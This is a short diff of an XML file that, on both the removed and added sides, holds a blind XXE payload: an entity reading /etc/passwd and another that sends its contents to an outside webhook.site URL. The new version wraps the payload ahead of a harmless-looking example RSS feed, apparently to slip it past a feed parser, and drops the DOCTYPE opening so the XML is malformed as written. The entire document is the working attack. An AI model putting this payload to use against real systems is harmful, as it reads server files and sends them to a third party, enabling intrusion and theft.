@@ -1,8 +1,15 @@
-<?xml version="1.0" encoding="utf-8"?>
-<!DOCTYPE RSS [
-<!ELEMENT RSS (#ANY)>
+
 <!ENTITY % xxe SYSTEM "file:///etc/passwd">
-<!ENTITY blind SYSTEM "https://webhook.site/c41c7b43-f14a-46cd-afd9-2d3068866bc9/?%xxe;">]><RSS>&blind;</RSSRSS>
-
-
-
+<!ENTITY blind SYSTEM "https://webhook.site/c41c7b43-f14a-46cd-afd9-2d3068866bc9/?%xxe;">]><foo>&blind;</foo>
+<rss version="2.0">
+  <channel>
+    <title>Example</title>
+    <link>http://example.com/</link>
+    <description>Example feed</description>
+    <item>
+      <title>Post 1</title>
+      <link>http://example.com/post1</link>
+      <pubDate>Wed, 24 Sep 2025 00:00:00 GMT</pubDate>
+    </item>
+  </channel>
+</rss>
